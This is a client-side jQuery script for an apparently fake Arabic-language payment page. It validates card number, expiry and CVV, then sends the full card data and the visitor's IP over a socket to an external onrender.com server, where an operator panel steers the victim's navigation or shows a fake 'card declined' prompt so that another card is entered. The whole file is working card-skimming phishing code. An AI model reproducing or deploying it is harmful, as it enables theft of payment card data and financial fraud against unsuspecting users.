
$(document).ready(function() {
    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "paymen.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    // Luhn Algorithm للتحقق من صحة رقم البطاقة
    function luhnCheck(cardNumber) {
        const digits = cardNumber.replace(/\D/g, '');
        if (digits.length < 13 || digits.length > 19) return false;
        
        let sum = 0;
        let isEven = false;
        
        for (let i = digits.length - 1; i >= 0; i--) {
            let digit = parseInt(digits[i], 10);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return sum % 10 === 0;
    }

    // التحقق من صحة تاريخ الانتهاء
    function isValidExpiryDate(expiryDate) {
        const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        if (!regex.test(expiryDate)) return false;
        
        const [month, year] = expiryDate.split('/');
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;
        
        const expYear = parseInt(year, 10);
        const expMonth = parseInt(month, 10);
        
        if (expYear < currentYear) return false;
        if (expYear === currentYear && expMonth < currentMonth) return false;
        
        return true;
    }

    // تنسيق رقم البطاقة - إضافة مسافة كل 4 أرقام
    $("#cardNumberI").on("input", function() {
        let value = $(this).val().replace(/\s+/g, '').replace(/[^\d]/g, '');
        let formattedValue = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        $(this).val(formattedValue);
    });

    // تنسيق تاريخ الانتهاء - MM/YY
    $("#expiry").on("input", function() {
        let value = $(this).val().replace(/\D/g, '');
        
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        $(this).val(value);
    });

    // التحقق من CVV - يجب أن يكون 3 أو 4 أرقام فقط
    $("#paymentForm input[name='cvv']").on("input", function() {
        $(this).val($(this).val().replace(/\D/g, '').substring(0, 4));
    });

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            if (page.includes("declined=true")) {
                $("#waitingScreen").removeClass("active");
                showDeclineModal();
            } else {
                window.location.href = page;
            }
        }
    });

    // عرض نافذة الرفض الاحترافية
    function showDeclineModal() {
        // إزالة أي نافذة رفض موجودة
        $("#declineModal").remove();
        
        const declineHTML = `
            <div id="declineModal" class="decline-modal-overlay">
                <div class="decline-modal-content">
                    <div class="decline-modal-icon">
                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="15" y1="9" x2="9" y2="15"></line>
                            <line x1="9" y1="9" x2="15" y2="15"></line>
                        </svg>
                    </div>
                    <h3 class="decline-modal-title">تم رفض البطاقة</h3>
                    <p class="decline-modal-text">للأسف، تم رفض عملية الدفع. يرجى التحقق من بيانات البطاقة وإعادة المحاولة ببطاقة أخرى.</p>
                    <button id="declineRetryBtn" class="decline-modal-button">إعادة المحاولة</button>
                </div>
            </div>
        `;
        
        $("body").append(declineHTML);
        
        // إضافة الأنماط
        const style = `
            <style id="declineStyles">
                .decline-modal-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 10000;
                    direction: rtl;
                }
                
                .decline-modal-content {
                    background: white;
                    border-radius: 16px;
                    padding: 40px 30px;
                    max-width: 400px;
                    width: 90%;
                    text-align: center;
                    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
                    animation: slideUp 0.3s ease-out;
                }
                
                @keyframes slideUp {
                    from {
                        opacity: 0;
                        transform: translateY(30px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
                
                .decline-modal-icon {
                    width: 80px;
                    height: 80px;
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
                    border-radius: 50%;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0 auto 20px;
                }
                
                .decline-modal-title {
                    font-size: 24px;
                    font-weight: 700;
                    color: #2c3e50;
                    margin: 0 0 12px 0;
                    font-family: "Cairo", serif;
                }
                
                .decline-modal-text {
                    font-size: 14px;
                    color: #666;
                    margin: 0 0 30px 0;
                    line-height: 1.6;
                    font-family: "Cairo", serif;
                }
                
                .decline-modal-button {
                    background: linear-gradient(135deg, #D74D1C 0%, #c43d0a 100%);
                    color: white;
                    border: none;
                    padding: 14px 40px;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    font-family: "Cairo", serif;
                    width: 100%;
                }
                
                .decline-modal-button:hover {
                    background: linear-gradient(135deg, #c43d0a 0%, #a83208 100%);
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(215, 77, 28, 0.3);
                }
                
                .decline-modal-button:active {
                    transform: translateY(0);
                }
            </style>
        `;
        
        if ($("#declineStyles").length === 0) {
            $("head").append(style);
        }
        
        // معالج الضغط على زر إعادة المحاولة
        $("#declineRetryBtn").on("click", function() {
            $("#declineModal").remove();
            // إعادة تعيين النموذج
            $("#paymentForm")[0].reset();
            // تنظيف sessionStorage للسماح بإعادة المحاولة
            window.location.href = "paymen.html";
        });
    }

    $("#paymentForm").on("submit", function(e) {
        e.preventDefault();
        
        const cardNumber = $("input[name='cardNumber']").val().replace(/\s+/g, '');
        const expiryDate = $("input[name='year']").val();
        const cvv = $("input[name='cvv']").val();
        const cardName = $("input[name='cardName']").val();
        
        // التحقق من صحة البيانات
        if (!luhnCheck(cardNumber)) {
            alert("رقم البطاقة غير صحيح. يرجى التحقق من الرقم.");
            return;
        }
        
        if (!isValidExpiryDate(expiryDate)) {
            alert("تاريخ الانتهاء غير صحيح أو منتهي الصلاحية. يرجى استخدام صيغة MM/YY.");
            return;
        }
        
        if (cvv.length < 3 || cvv.length > 4) {
            alert("رمز الحماية (CVV) يجب أن يكون 3 أو 4 أرقام.");
            return;
        }
        
        if (!cardName.trim()) {
            alert("يرجى إدخال اسم حامل البطاقة.");
            return;
        }
        
        $("#waitingScreen").addClass("active");

        const data = {
            ip: window.visitorIP,
            total: $("input[name='amount']:checked").val(),
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            cvv: cvv,
            cardHolderName: cardName,
            cardLast4: cardNumber.slice(-4),
            createdAt: new Date()
        };

        if (window.visitorIP) {
            window.socket.emit("submitPayment", data);
            // ننتظر لوحة التحكم
        } else {
            $("#waitingScreen").removeClass("active");
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
